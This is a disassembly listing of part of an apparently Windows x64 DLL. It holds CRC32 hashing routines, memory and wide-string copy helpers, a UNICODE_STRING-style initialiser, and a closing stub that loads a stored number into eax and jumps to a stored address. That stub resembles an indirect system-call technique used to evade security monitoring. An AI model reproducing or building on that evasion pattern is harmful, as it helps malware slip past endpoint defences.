   180003b6a:	41 d1 e8             	shr    $1,%r8d
   180003b6d:	8d 0c 12             	lea    (%rdx,%rdx,1),%ecx
   180003b70:	44 33 c1             	xor    %ecx,%r8d
   180003b73:	8d 0c 12             	lea    (%rdx,%rdx,1),%ecx
   180003b76:	41 81 e0 55 55 55 55 	and    $0x55555555,%r8d
   180003b7d:	44 33 c1             	xor    %ecx,%r8d
   180003b80:	41 8b d0             	mov    %r8d,%edx
   180003b83:	c1 ea 02             	shr    $0x2,%edx
   180003b86:	42 8d 0c 85 00 00 00 	lea    0x0(,%r8,4),%ecx
   180003b8d:	00 
   180003b8e:	33 d1                	xor    %ecx,%edx
   180003b90:	42 8d 0c 85 00 00 00 	lea    0x0(,%r8,4),%ecx
   180003b97:	00 
   180003b98:	81 e2 33 33 33 33    	and    $0x33333333,%edx
   180003b9e:	33 d1                	xor    %ecx,%edx
   180003ba0:	44 8b ca             	mov    %edx,%r9d
   180003ba3:	c1 ea 04             	shr    $0x4,%edx
   180003ba6:	41 81 e1 0f 0f 0f ff 	and    $0xff0f0f0f,%r9d
   180003bad:	41 c1 e1 04          	shl    $0x4,%r9d
   180003bb1:	44 0b ca             	or     %edx,%r9d
   180003bb4:	8d 14 00             	lea    (%rax,%rax,1),%edx
   180003bb7:	44 8b c2             	mov    %edx,%r8d
   180003bba:	41 81 f0 b7 1d c1 04 	xor    $0x4c11db7,%r8d
   180003bc1:	41 0f c9             	bswap  %r9d
   180003bc4:	41 8b c9             	mov    %r9d,%ecx
   180003bc7:	33 c8                	xor    %eax,%ecx
   180003bc9:	44 0f 49 c2          	cmovns %edx,%r8d
   180003bcd:	43 8d 0c 09          	lea    (%r9,%r9,1),%ecx
   180003bd1:	43 8d 04 00          	lea    (%r8,%r8,1),%eax
   180003bd5:	8b d0                	mov    %eax,%edx
   180003bd7:	81 f2 b7 1d c1 04    	xor    $0x4c11db7,%edx
   180003bdd:	44 33 c1             	xor    %ecx,%r8d
   180003be0:	0f 49 d0             	cmovns %eax,%edx
   180003be3:	03 c9                	add    %ecx,%ecx
   180003be5:	8d 04 12             	lea    (%rdx,%rdx,1),%eax
   180003be8:	44 8b c0             	mov    %eax,%r8d
   180003beb:	41 81 f0 b7 1d c1 04 	xor    $0x4c11db7,%r8d
   180003bf2:	33 d1                	xor    %ecx,%edx
   180003bf4:	44 0f 49 c0          	cmovns %eax,%r8d
   180003bf8:	03 c9                	add    %ecx,%ecx
   180003bfa:	43 8d 04 00          	lea    (%r8,%r8,1),%eax
   180003bfe:	8b d0                	mov    %eax,%edx
   180003c00:	81 f2 b7 1d c1 04    	xor    $0x4c11db7,%edx
   180003c06:	44 33 c1             	xor    %ecx,%r8d
   180003c09:	0f 49 d0             	cmovns %eax,%edx
   180003c0c:	03 c9                	add    %ecx,%ecx
   180003c0e:	8d 04 12             	lea    (%rdx,%rdx,1),%eax
   180003c11:	44 8b c0             	mov    %eax,%r8d
   180003c14:	41 81 f0 b7 1d c1 04 	xor    $0x4c11db7,%r8d
   180003c1b:	33 d1                	xor    %ecx,%edx
   180003c1d:	44 0f 49 c0          	cmovns %eax,%r8d
   180003c21:	03 c9                	add    %ecx,%ecx
   180003c23:	43 8d 04 00          	lea    (%r8,%r8,1),%eax
   180003c27:	8b d0                	mov    %eax,%edx
   180003c29:	81 f2 b7 1d c1 04    	xor    $0x4c11db7,%edx
   180003c2f:	44 33 c1             	xor    %ecx,%r8d
   180003c32:	0f 49 d0             	cmovns %eax,%edx
   180003c35:	03 c9                	add    %ecx,%ecx
   180003c37:	8d 04 12             	lea    (%rdx,%rdx,1),%eax
   180003c3a:	44 8b c0             	mov    %eax,%r8d
   180003c3d:	41 81 f0 b7 1d c1 04 	xor    $0x4c11db7,%r8d
   180003c44:	33 d1                	xor    %ecx,%edx
   180003c46:	44 0f 49 c0          	cmovns %eax,%r8d
   180003c4a:	03 c9                	add    %ecx,%ecx
   180003c4c:	43 8d 14 00          	lea    (%r8,%r8,1),%edx
   180003c50:	8b c2                	mov    %edx,%eax
   180003c52:	35 b7 1d c1 04       	xor    $0x4c11db7,%eax
   180003c57:	41 33 c8             	xor    %r8d,%ecx
   180003c5a:	41 0f b6 0a          	movzbl (%r10),%ecx
   180003c5e:	0f 49 c2             	cmovns %edx,%eax
   180003c61:	84 c9                	test   %cl,%cl
   180003c63:	0f 85 f7 fe ff ff    	jne    0x180003b60
   180003c69:	f7 d0                	not    %eax
   180003c6b:	8b d0                	mov    %eax,%edx
   180003c6d:	d1 ea                	shr    $1,%edx
   180003c6f:	8d 0c 00             	lea    (%rax,%rax,1),%ecx
   180003c72:	03 c0                	add    %eax,%eax
   180003c74:	33 d1                	xor    %ecx,%edx
   180003c76:	81 e2 55 55 55 55    	and    $0x55555555,%edx
   180003c7c:	33 d0                	xor    %eax,%edx
   180003c7e:	44 8b c2             	mov    %edx,%r8d
   180003c81:	41 c1 e8 02          	shr    $0x2,%r8d
   180003c85:	8d 04 95 00 00 00 00 	lea    0x0(,%rdx,4),%eax
   180003c8c:	44 33 c0             	xor    %eax,%r8d
   180003c8f:	8d 04 95 00 00 00 00 	lea    0x0(,%rdx,4),%eax
   180003c96:	41 81 e0 33 33 33 33 	and    $0x33333333,%r8d
   180003c9d:	44 33 c0             	xor    %eax,%r8d
   180003ca0:	41 8b c0             	mov    %r8d,%eax
   180003ca3:	41 8b c8             	mov    %r8d,%ecx
   180003ca6:	c1 e8 04             	shr    $0x4,%eax
   180003ca9:	c1 e1 04             	shl    $0x4,%ecx
   180003cac:	33 c1                	xor    %ecx,%eax
   180003cae:	41 c1 e0 04          	shl    $0x4,%r8d
   180003cb2:	25 0f 0f 0f 0f       	and    $0xf0f0f0f,%eax
   180003cb7:	41 33 c0             	xor    %r8d,%eax
   180003cba:	0f c8                	bswap  %eax
   180003cbc:	c3                   	ret
   180003cbd:	cc                   	int3
   180003cbe:	cc                   	int3
   180003cbf:	cc                   	int3
   180003cc0:	4c 8b c1             	mov    %rcx,%r8
   180003cc3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   180003cc8:	0f b6 09             	movzbl (%rcx),%ecx
   180003ccb:	84 c9                	test   %cl,%cl
   180003ccd:	0f 84 99 00 00 00    	je     0x180003d6c
   180003cd3:	0f b6 d1             	movzbl %cl,%edx
   180003cd6:	4d 8d 40 01          	lea    0x1(%r8),%r8
   180003cda:	33 c2                	xor    %edx,%eax
   180003cdc:	8b c8                	mov    %eax,%ecx
   180003cde:	d1 e8                	shr    $1,%eax
   180003ce0:	83 e1 01             	and    $0x1,%ecx
   180003ce3:	f7 d9                	neg    %ecx
   180003ce5:	81 e1 20 83 78 ed    	and    $0xed788320,%ecx
   180003ceb:	33 c8                	xor    %eax,%ecx
   180003ced:	8b c1                	mov    %ecx,%eax
   180003cef:	d1 e9                	shr    $1,%ecx
   180003cf1:	83 e0 01             	and    $0x1,%eax
   180003cf4:	f7 d8                	neg    %eax
   180003cf6:	25 20 83 78 ed       	and    $0xed788320,%eax
   180003cfb:	33 c1                	xor    %ecx,%eax
   180003cfd:	8b c8                	mov    %eax,%ecx
   180003cff:	d1 e8                	shr    $1,%eax
   180003d01:	83 e1 01             	and    $0x1,%ecx
   180003d04:	f7 d9                	neg    %ecx
   180003d06:	81 e1 20 83 78 ed    	and    $0xed788320,%ecx
   180003d0c:	33 c8                	xor    %eax,%ecx
   180003d0e:	8b c1                	mov    %ecx,%eax
   180003d10:	d1 e9                	shr    $1,%ecx
   180003d12:	83 e0 01             	and    $0x1,%eax
   180003d15:	f7 d8                	neg    %eax
   180003d17:	25 20 83 78 ed       	and    $0xed788320,%eax
   180003d1c:	33 c1                	xor    %ecx,%eax
   180003d1e:	8b c8                	mov    %eax,%ecx
   180003d20:	d1 e8                	shr    $1,%eax
   180003d22:	83 e1 01             	and    $0x1,%ecx
   180003d25:	f7 d9                	neg    %ecx
   180003d27:	81 e1 20 83 78 ed    	and    $0xed788320,%ecx
   180003d2d:	33 c8                	xor    %eax,%ecx
   180003d2f:	8b c1                	mov    %ecx,%eax
   180003d31:	d1 e9                	shr    $1,%ecx
   180003d33:	83 e0 01             	and    $0x1,%eax
   180003d36:	f7 d8                	neg    %eax
   180003d38:	25 20 83 78 ed       	and    $0xed788320,%eax
   180003d3d:	33 c1                	xor    %ecx,%eax
   180003d3f:	8b c8                	mov    %eax,%ecx
   180003d41:	d1 e8                	shr    $1,%eax
   180003d43:	83 e1 01             	and    $0x1,%ecx
   180003d46:	f7 d9                	neg    %ecx
   180003d48:	81 e1 20 83 78 ed    	and    $0xed788320,%ecx
   180003d4e:	33 c8                	xor    %eax,%ecx
   180003d50:	8b c1                	mov    %ecx,%eax
   180003d52:	d1 e9                	shr    $1,%ecx
   180003d54:	83 e0 01             	and    $0x1,%eax
   180003d57:	f7 d8                	neg    %eax
   180003d59:	25 20 83 78 ed       	and    $0xed788320,%eax
   180003d5e:	33 c1                	xor    %ecx,%eax
   180003d60:	41 0f b6 08          	movzbl (%r8),%ecx
   180003d64:	84 c9                	test   %cl,%cl
   180003d66:	0f 85 67 ff ff ff    	jne    0x180003cd3
   180003d6c:	f7 d0                	not    %eax
   180003d6e:	c3                   	ret
   180003d6f:	cc                   	int3
   180003d70:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   180003d74:	4c 8b c1             	mov    %rcx,%r8
   180003d77:	48 85 d2             	test   %rdx,%rdx
   180003d7a:	74 2a                	je     0x180003da6
   180003d7c:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   180003d83:	48 ff c0             	inc    %rax
   180003d86:	66 83 3c 42 00       	cmpw   $0x0,(%rdx,%rax,2)
   180003d8b:	75 f6                	jne    0x180003d83
   180003d8d:	b9 fc ff 00 00       	mov    $0xfffc,%ecx
   180003d92:	03 c0                	add    %eax,%eax
   180003d94:	3b c1                	cmp    %ecx,%eax
   180003d96:	0f 47 c1             	cmova  %ecx,%eax
   180003d99:	66 41 89 00          	mov    %ax,(%r8)
   180003d9d:	8d 48 02             	lea    0x2(%rax),%ecx
   180003da0:	66 41 89 48 02       	mov    %cx,0x2(%r8)
   180003da5:	c3                   	ret
   180003da6:	33 c0                	xor    %eax,%eax
   180003da8:	89 01                	mov    %eax,(%rcx)
   180003daa:	c3                   	ret
   180003dab:	cc                   	int3
   180003dac:	cc                   	int3
   180003dad:	cc                   	int3
   180003dae:	cc                   	int3
   180003daf:	cc                   	int3
   180003db0:	4d 8b c8             	mov    %r8,%r9
   180003db3:	48 8b c1             	mov    %rcx,%rax
   180003db6:	4d 85 c0             	test   %r8,%r8
   180003db9:	74 1a                	je     0x180003dd5
   180003dbb:	48 2b d1             	sub    %rcx,%rdx
   180003dbe:	66 90                	xchg   %ax,%ax
   180003dc0:	44 0f b6 04 02       	movzbl (%rdx,%rax,1),%r8d
   180003dc5:	44 88 00             	mov    %r8b,(%rax)
   180003dc8:	48 8d 40 01          	lea    0x1(%rax),%rax
   180003dcc:	49 83 e9 01          	sub    $0x1,%r9
   180003dd0:	75 ee                	jne    0x180003dc0
   180003dd2:	48 8b c1             	mov    %rcx,%rax
   180003dd5:	c3                   	ret
   180003dd6:	cc                   	int3
   180003dd7:	cc                   	int3
   180003dd8:	cc                   	int3
   180003dd9:	cc                   	int3
   180003dda:	cc                   	int3
   180003ddb:	cc                   	int3
   180003ddc:	cc                   	int3
   180003ddd:	cc                   	int3
   180003dde:	cc                   	int3
   180003ddf:	cc                   	int3
   180003de0:	48 85 c9             	test   %rcx,%rcx
   180003de3:	74 40                	je     0x180003e25
   180003de5:	48 85 d2             	test   %rdx,%rdx
   180003de8:	74 3b                	je     0x180003e25
   180003dea:	66 83 39 00          	cmpw   $0x0,(%rcx)
   180003dee:	74 0a                	je     0x180003dfa
   180003df0:	48 83 c1 02          	add    $0x2,%rcx
   180003df4:	66 83 39 00          	cmpw   $0x0,(%rcx)
   180003df8:	75 f6                	jne    0x180003df0
   180003dfa:	0f b7 02             	movzwl (%rdx),%eax
   180003dfd:	66 85 c0             	test   %ax,%ax
   180003e00:	74 1e                	je     0x180003e20
   180003e02:	48 2b d1             	sub    %rcx,%rdx
   180003e05:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180003e0c:	00 00 00 00 
   180003e10:	66 89 01             	mov    %ax,(%rcx)
   180003e13:	48 83 c1 02          	add    $0x2,%rcx
   180003e17:	0f b7 04 0a          	movzwl (%rdx,%rcx,1),%eax
   180003e1b:	66 85 c0             	test   %ax,%ax
   180003e1e:	75 f0                	jne    0x180003e10
   180003e20:	33 c0                	xor    %eax,%eax
   180003e22:	66 89 01             	mov    %ax,(%rcx)
   180003e25:	48 8b c1             	mov    %rcx,%rax
   180003e28:	c3                   	ret
   180003e29:	cc                   	int3
   180003e2a:	cc                   	int3
   180003e2b:	cc                   	int3
   180003e2c:	cc                   	int3
   180003e2d:	cc                   	int3
   180003e2e:	cc                   	int3
   180003e2f:	cc                   	int3
   180003e30:	48 85 c9             	test   %rcx,%rcx
   180003e33:	74 33                	je     0x180003e68
   180003e35:	48 85 d2             	test   %rdx,%rdx
   180003e38:	74 2e                	je     0x180003e68
   180003e3a:	48 3b ca             	cmp    %rdx,%rcx
   180003e3d:	74 29                	je     0x180003e68
   180003e3f:	44 0f b7 02          	movzwl (%rdx),%r8d
   180003e43:	48 8b c1             	mov    %rcx,%rax
   180003e46:	66 45 85 c0          	test   %r8w,%r8w
   180003e4a:	74 17                	je     0x180003e63
   180003e4c:	48 2b d1             	sub    %rcx,%rdx
   180003e4f:	90                   	nop
   180003e50:	66 44 89 00          	mov    %r8w,(%rax)
   180003e54:	48 83 c0 02          	add    $0x2,%rax
   180003e58:	44 0f b7 04 02       	movzwl (%rdx,%rax,1),%r8d
   180003e5d:	66 45 85 c0          	test   %r8w,%r8w
   180003e61:	75 ed                	jne    0x180003e50
   180003e63:	33 d2                	xor    %edx,%edx
   180003e65:	66 89 10             	mov    %dx,(%rax)
   180003e68:	48 8b c1             	mov    %rcx,%rax
   180003e6b:	c3                   	ret
   180003e6c:	cc                   	int3
   180003e6d:	cc                   	int3
   180003e6e:	cc                   	int3
   180003e6f:	cc                   	int3
   180003e70:	89 0d 8a 11 00 00    	mov    %ecx,0x118a(%rip)        # 0x180005000
   180003e76:	48 89 15 87 11 00 00 	mov    %rdx,0x1187(%rip)        # 0x180005004
   180003e7d:	c3                   	ret
   180003e7e:	4c 8b d1             	mov    %rcx,%r10
   180003e81:	8b 05 79 11 00 00    	mov    0x1179(%rip),%eax        # 0x180005000
   180003e87:	ff 25 77 11 00 00    	jmp    *0x1177(%rip)        # 0x180005004
   180003e8d:	c3                   	ret
